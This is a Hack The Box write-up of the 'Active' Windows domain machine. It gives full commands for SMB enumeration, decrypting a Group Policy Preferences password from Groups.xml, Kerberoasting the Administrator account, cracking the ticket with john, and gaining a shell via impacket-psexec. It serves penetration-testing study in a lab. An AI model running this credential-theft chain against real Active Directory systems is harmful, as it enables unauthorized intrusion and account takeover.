---
layout: post
title:  "Active Writeup - Hack The Box"
date:   2025-08-27
desc: ""
keywords: "HTB,OSCP,OSEP,eCPPTv3,Windows,Active Directory,SMB Enumeration,GPP Abuse,Kerberoasting Attack,Easy"
categories: [HTB]
tags: [HTB,OSCP,OSEP,eCPPTv3,Windows,Active Directory,SMB Enumeration,GPP Abuse,Kerberoasting Attack,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/active_writeup/Active.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

I continue my learning with another very nice **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine, which makes me understand a little more the engagement of **Active Directory** environments, a **Windows** service that is found in many real world environments so it is a mandatory subject of study for me if I want to work as a **Pentester**. Even though it is a lab without much complexity, but with many concepts to be applied, it takes me quite a while to research, understand and apply the techniques needed to engage the **Active** box. The community has rated it as **Easy** but personally I would rate it higher, so now it's time to sign in to my account and spawn the box to start my writeup.

<br /><br />
<img src="{{ site.img_path }}/active_writeup/Active_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Before starting the **Reconnaissance** phase, I use the `ping` tool to send a trace to the machine using its **IP** to verify that I already have connectivity with it, but I also validate (with **some degree of certainty**) that the machine has a **Windows** Operating System installed using the tool developed by the **[hack4u](https://hack4u.io/){:target="_blank"}** community, `whichSystem.py`. With all the steps described previously I start to list the open ports with `nmap`, I also take advantage of the scripts of this excellent tool to leak information of the services and versions that I will have to investigate to try to engage the system. Being an **Active Directory** environment I find a lot of protocol information available, and I take advantage of other tools such as **[`fastTCPScan`](https://s4vitar.github.io/fasttcpscan-go/#){:target="_blank"}** to list open ports quickly and even improve the presentation of `nmap` results in a browser, using the **[honze-net stylesheet](https://github.com/honze-net/nmap-bootstrap-xsl){:target="_blank"}**.

```bash
ping -c 2 10.10.10.100
whichSystem.py 10.10.10.100
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.100 -oG allPorts
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49171,49173 10.10.10.100 -oN targeted
cat targeted
# Kerberos, LDAP, RPC, Active Directory LDAP
# Domain: active.htb

fastTCPScan -host 10.10.10.100 -threads 100

nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49165,49171,49173 10.10.10.100 --stylesheet https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/master/nmap-bootstrap.xsl -oX targetedBootstrap

php -S 0.0.0.0:80
# http://localhost/targetedBootstrap
```

<br />
<img src="{{ site.img_path }}/active_writeup/Active_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I have the **DNS** protocol available, so I'm going to try to leak DNS server information with `dig`, but I can't find anything interesting nor does an **[AXFR](https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/){:target="_blank"}** attack take effect. I'm going to add the domain name to my **hosts** file so that my machine knows how to resolve to the real **IP** of the machine, once these changes are made I go back to using `dig` but using the **IP** and **domain** together but I still can't get any information from the server.

```bash
dig @10.10.10.100
dig @10.10.10.100 ns
dig @10.10.10.100 mx
dig @10.10.10.100 axfr

nvim /etc/hosts
cat /etc/hosts | tail -n 1
cat /etc/hosts | tail -n 1 | awk 'NF{print $NF}' | xargs ping -c 2

dig @10.10.10.100 active.htb
dig @10.10.10.100 active.htb ns
dig @10.10.10.100 active.htb mx
dig @10.10.10.100 active.htb axfr
```

<br />
<img src="{{ site.img_path }}/active_writeup/Active_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can leak **SMB** protocol information with `crackmapexec`, which also gives me **OS** information such as the name of the domain controller (**DC**) and that the protocol **is signed**, which is a good security measure to prevent an **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**. With `smbclient` I list the shared resources and there are two very interesting ones (**Replication** and **Users**), but a very curious fact is that with `smbmap` it denies me the access. The other protocol that I always try to enumerate is **RPC**, but when I try to log in without entering a password with `rpcclient` it does not allow me to leak information. I go to access the **Replication** resource with `smbclient` and I find many directories available for further investigation.

> **[SMB relay attack](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html?highlight=smb%20relay#smb-relay-attack){:target="_blank"}**: This attack uses the **Responder** toolkit to capture **SMB** authentication sessions on an internal network, and relays them to a target machine. If the authentication session is successful, it will automatically drop you into a system shell.

> **[SMB-Scanning](https://www.vectra.ai/modern-attack/attack-techniques/smb-scanning){:target="_blank"}**: With this technique, attackers take advantage of the **SMB protocol's** built-in trust in network users. The attacker uses scanning to identify available accounts to target, then intercepts and manipulates a valid authentication session. By capturing and relaying authentication traffic, the attacker **impersonates** the user to gain unauthorized access.

```bash
crackmapexec smb 10.10.10.100
smbclient -L 10.10.10.100 -N
smbmap -H 10.10.10.100 -u 'null' --no-banner
# [!] Access denied on 10.10.10.100, no fun for you...

crackmapexec smb 10.10.10.100 --shares
crackmapexec smb 10.10.10.100 -u 'null' -p 'null' --shares

rpcclient -U "" 10.10.10.100 -N
  enumdomusers
  enumdomgroups
  quit

smbclient -L 10.10.10.100 -N
# Replication, Users
smbclient //10.10.10.100/Replication -N
  dir
  cd active.htb
```

<br />
<img src="{{ site.img_path }}/active_writeup/Active_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

As there is a lot of information to dig into I'm going to set up a **CIFS mount**, so I can access the files as if they were on my local file system but for some reason it won't allow me to do so, most likely because I don't have valid credentials. If I use `smbclient` to reconnect via **SMB** protocol, I can enumerate manually even if it takes me much longer. I get lucky and find the **Groups.xml** file that I download to my machine to analyze. I try using `smbmap` to perform the same action and **it does let me this time** access the resources and even download the **XML** file, so far **I don't know what my previous error was**. In the content of the **Groups.xml** file I find the password hash of the **SVC_TGS** account, but if I try a brute force attack with `john` I can't crack it.

> **[Groups XML file](https://docs.e-spirit.com/odfs/edocs/admi/user-permission/configuration/configuring-ser/groups-xml-file/index.html){:target="_blank"}** (**groups.xml**): The **groups.xml** group file where groups are defined is available by default. It needs to be introduced to the permission service configuration file **service.ini** by using the **NAME.path** parameter and can be edited in **FirstSpirit ServerMonitoring**.

```bash
mkdir SMBActive
mount -t cifs //10.10.10.100/Replication /mnt/SMBActive
mount -t cifs //10.10.10.100/Replication /mnt/SMBActive -o username='null',password='null',domain='ACTIVE.HTB',r
mount -t cifs //10.10.10.100/Replication /mnt/SMBActive -o username='null',password='null',domain='WORKGROUP',rw
mount -t cifs //10.10.10.100/Users /mnt/SMBActive
mount -t cifs //10.10.10.100/Users /mnt/SMBActive -o username='null',password='null',domain='WORKGROUP',rw
mount -t cifs //10.10.10.100/Users /mnt/SMBActive -o username='null',password='null',domain='ACTIVE.HTB',rw

smbclient //10.10.10.100/Replication -N
  cd \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\
  prompt off
  mget Groups.xml

ncat Groups.xml

smbmap -H 10.10.10.100 --no-banner -r Replication/
...
smbmap -H 10.10.10.100 --no-banner -r Replication/active.htb/policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Machine/Preferences/Groups

mv 10.10.10.100-Replication_active.htb_policies_\{31B2F340-016D-11D2-945F-00C04FB984F9\}_Machine_Preferences_Groups_Groups.xml Groups.xml

nvim hash
john -w=$(locate rockyou.txt)
john -w=/usr/share/wordlists/rockyou.txt hash
```

<br />
<img src="{{ site.img_path }}/active_writeup/Active_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I do some research with a search engine and look for a project on **Github** that is related to **decrypting cpassword from the Groups.xml file**, I'm lucky because there are some repositories like **[t0thkr1s](https://github.com/t0thkr1s/gpp-decrypt){:target="_blank"}** that has a **Python** script that can get in clear text the password. I'm going to clone with `git` the project on my attacking machine and install the necessary libraries, but due to **Python** security measures it won't let me install deprecated libraries so I have to setup a **virtual environment** with `python` and this way I can continue the installation and get the script running. I access the help panel of the tool to get information about how it works and what parameter to use to specify the **.xml** file where the password hash is stored, so I can get it in clear text.

> **Group Policy Preferences** (**GPP**) was introduced in **Windows Server 2008** and allows administrators to **set domain passwords** via Group Policy. However, the passwords are encrypted with a publicly known **AES-256** key, making them trivial to decrypt.

```bash
git clone https://github.com/t0thkr1s/gpp-decrypt
cd gpp-decrypt
pip install gpp-decrypt
pip2 install gpp-decrypt

pip3 install gpp-decrypt

python3 -m venv ./
./bin/pip3 install gpp-decrypt
./bin/pip3 install .
gpp-decrypt --help
./bin/python3 gpp-decrypt.py --help
./bin/python3 gpp-decrypt.py -f ../Groups.xml

crackmapexec smb 10.10.10.100 -u 'svc_tgs' -p 'G...8'
rpcclient -U "svc_tgs%G...8" 10.10.10.100
  enumdomusers
  enumdomgroups
```

<br />
<img src="{{ site.img_path }}/active_writeup/Active_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have found credentials for an account I must validate it with `crackmapexec` and then I can continue the **Reconnaissance** phase. With `rpcclient` I can now connect and leak information of the domain groups and users, to speed up the task I run the enumeration commands with an oneliner and dig into those resources that seem more juicy like **Domain Admins group users** or **Administrator account metadata** but I can't find anything interesting at the moment.

```bash
rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "enumdomusers"
rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "enumdomgroups"
rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "querygroupmem 0x200"
rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "querygroupmem 0x200" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]'

rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "querygroupmem 0x200" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "queryuser $rid"; done
rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "querygroupmem 0x200" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "queryuser $rid" | grep "User Name" | awk 'NF{print $NF}'; done
echo; rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "querygroupmem 0x200" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do echo "$rid: $(rpcclient -U "svc_tgs%G...8" 10.10.10.100 -c "queryuser $rid" | grep "User Name" | awk 'NF{print $NF}')"; done

smbclient -L 10.10.10.100 -U "svc_tgs%G...8"
smbmap -H 10.10.10.100 -u 'svc_tgs' -p 'G...8' --no-banner
crackmapexec smb 10.10.10.100 -u 'svc_tgs' -p 'G...8' --shares
```

<br />
<img src="{{ site.img_path }}/active_writeup/Active_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I list the shares again with `smbmap`, but this time I focus on **Users** and I have the ability to list the personal directories of all the accounts of the domain which allows me to find the first flag in the **Desktop** directory of the **SVC_TGS** account. With the necessary `smbmap` parameters I succeed in downloading on my machine the first flag and accessing its contents.

```bash
smbmap -H 10.10.10.100 -u 'svc_tgs' -p 'G...8' --no-banner -r Users/
smbmap -H 10.10.10.100 -u 'svc_tgs' -p 'G...8' --no-banner -r Users/SVC_TGS/Desktop

smbmap --help
# -d DOMAIN             Domain name (default WORKGROUP)
# -r [PATH]             Recursively list dirs and files (no share\path lists the root of ALL shares), ex. 'email/backup'
# -q                    Quiet verbose output. Only shows shares you have READ or WRITE on, and suppresses file listing when performing a search (-A).
# -A PATTERN            Define a file name pattern (regex) that auto downloads a file on a match (requires -r), not case
                        sensitive, ex '(web|global).(asax|config)'

smbmap -H 10.10.10.100 -u 'svc_tgs' -p 'G...8' --no-banner -r Users -q -d ACTIVE.HTB -A user.txt
smbmap -H 10.10.10.100 -u 'svc_tgs' -p 'G...8' --no-banner --download Users/svc_tgs/Desktop/user.txt
```

<br />
<img src="{{ site.img_path }}/active_writeup/Active_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Now that I have credentials I try again to setup the mounts and this time I succeed, which allows me to enumerate first the **Replication** share faster but I can't find files or information that would allow me to access the system. With `df` I can get information from the mounted resource, such as space used, to make a guess as to how many files I would have to investigate. Another attack vector I investigate is my ability to write to directories accessible for uploading malicious content, so with an oneliner and with the help of `smbcacls` I search for directories where I have this ability but find none. If I mount the other resource, **Users*, I'm not allowed to upload content either.

```bash
pushd /mnt
mkdir SMBActive
mount -t cifs //10.10.10.100/Replication /mnt/SMBActive -o username='svc_tgs',password='G...8',domain='ACTIVE.HTB',rw
tree -fas
df -h
df -k -F cifs

find . \-type d 2>/dev/null
find . \-type d 2>/dev/null | sed -e 's/^\.\///'
find . \-type d 2>/dev/null | sed -e 's/^\.\///' | while read directory; do echo -e "\n[+] ACLs/Everyone on $directory"; smbcacls //10.10.10.100/Replication active.htb/$directory -U 'SVC_TGS%G...8' | grep -i "everyone"; done

umount SMBActive
mount -t cifs //10.10.10.100/Users /mnt/SMBActive -o username='svc_tgs',password='G...8',domain='ACTIVE.HTB',rw
find . \-type d 2>/dev/null | sed -e 's/^\.\///' | while read directory; do echo -e "\n[+] ACLs/Everyone on $directory"; smbcacls //10.10.10.100/Users $directory -U 'SVC_TGS%G...8' | grep -i "everyone"; done

umount SMBActive

smbcacls //10.10.10.100/Replication ACTIVE.HTB -U "svc_tgs%G...8" | grep -i 'everyone'
```

<br />
<img src="{{ site.img_path }}/active_writeup/Active_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I remember that I have other protocols to investigate like **LDAP** or **Kerberos**, so I first try to leak information of the domain users with **[impacket-GetADUsers](https://wadcoms.github.io/wadcoms/Impacket-GetADUsers/){:target="_blank"}** and observe some interesting activities of the **Administrator** account (**last Logon**). My next attack is with the **[impacket-GetNPUsers](https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/){:target="_blank"}** tool, which allows me to check if the **Kerberos** protocol is vulnerable to an **[AS-REP Roasting attack](https://redfoxsec.com/blog/as-rep-roasting/){:target="_blank"}** but none of the accounts have pre-authentication disabled. My last option is **[impacket-GetUsersSPNs](https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/){:target="_blank"}** which tries to get a **TGT** through a **[Kerberoasting Attack](https://www.vaadata.com/blog/what-is-kerberoasting-attack-and-security-tips-explained/#what-is-kerberoasting){:target="_blank"}** and then try to crack it with `john`. This last attack worked after synchronizing my system clock with that of the victim host and allowed me to retrieve the **Administrator account ticket** which I was finally able to crack with `john` and get the password in clear text. I was finally able to connect with `impacket-psexec` with the account with maximum privileges to access the last flag and finish the engagement of this excellent machine.

> **[Impacket’s GetADUsers.py](https://wadcoms.github.io/wadcoms/Impacket-GetADUsers/){:target="_blank"}** will attempt to gather data about the domain’s users and their corresponding email addresses.

> **[Impacket’s GetNPUsers.py](https://wadcoms.github.io/wadcoms/Impacket-GetNPUsers/){:target="_blank"}** will attempt to harvest the **non-preauth AS_REP** responses for a given list of usernames. These responses will be encrypted with the user’s password, which can then be cracked offline.

> **[AS-REP Roasting](https://redfoxsec.com/blog/as-rep-roasting/){:target="_blank"}**: is an exploitation technique that targets the **Kerberos** protocol. It allows an attacker to retrieve password hashes for users that do **not require pre-authentication**. **Pre-authentication** is an initial stage in **Kerberos authentication** that prevents brute-force attacks. If a user has “Do not use Kerberos pre-authentication” enabled, an attacker can recover a **Kerberos AS-REP encrypted** with the user’s **RC4-HMAC’d password** and attempt to crack this ticket offline.

> **[Impacket’s GetUserSPNs.py](https://wadcoms.github.io/wadcoms/Impacket-GetUserSPNs/){:target="_blank"}** will attempt to fetch **Service Principal Names** that are associated with normal user accounts. What is returned is a ticket that is encrypted with the user account’s password, which can then be bruteforced offline.

> A **[Kerberoasting attack](https://www.vaadata.com/blog/what-is-kerberoasting-attack-and-security-tips-explained/#what-is-kerberoasting){:target="_blank"}** targets **Active Directory environments** using the Kerberos protocol for authentication. **Kerberoasting** enables an attacker with a valid account on the network to retrieve Kerberos tickets called **Service Tickets**. These tickets contain information encrypted using the password of the account linked to the service. The attacker’s objective is to retrieve these tickets and perform an offline cryptanalysis in an attempt to guess the password of the associated account.

> **[Impacket’s psexec.py](https://wadcoms.github.io/wadcoms/Impacket-PsExec/){:target="_blank"}** offers `psexec` like functionality. This will give you an interactive shell on the Windows host.

> **PsExec** is a legitimate tool that allows users to run programs on remote systems. It can be used for a variety of legitimate tasks such as **troubleshooting**, **deploying software updates and patches**, and **executing commands and scripts** on multiple systems simultaneously.

```bash
impacket-GetADUsers --help
# Queries target domain for users data
impacket-GetADUsers -all ACTIVE.HTB/SVC_TGS:G...8 -dc-ip 10.10.10.100

impacket-GetNPUsers --help
# Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

nvim Users.txt
cat !$
for user in $(cat Users.txt); do impacket-GetNPUsers ACTIVE.HTB/$user -no-pass -dc-ip 10.10.10.100; done

impacket-GetUserSPNs ACTIVE.HTB/SVC_TGS:G...8 -dc-ip 10.10.10.100 -request -output tgs.hash
# [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)

rdate -n 10.10.10.100
john -w=$(locate rockyou.txt)                             # [Tab]
john -w=/usr/share/wordlists/rockyou.txt tgs.hash
crackmapexec smb 10.10.10.100 -u 'Administrator' -p 'T...8'

impacket-psexec ACTIVE.HTB/Administrator:T...8@10.10.10.100 cmd.exe
```

<br />
<img src="{{ site.img_path }}/active_writeup/Active_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/active_writeup/Active_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

> Another excellent **[Hack The Box](https://www.hackthebox.com){:target="_blank"}** lab that I can finish, taking with me a huge baggage of knowledge in **techniques**, **technologies** and **practice** of exploiting misconfigurations that I could remember from previous machines. The configuration of the **Active Directory labs** are **excellent** and simulate a real one that allows me to learn more about this **Windows** service that also motivates me to continue researching and learn about current vulnerabilities that will help me in my professional career. I will take advantage of this shot of adrenaline to continue with the next box, without forgetting to kill the **Active**.

<br /><br />
<img src="{{ site.img_path }}/active_writeup/Active_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
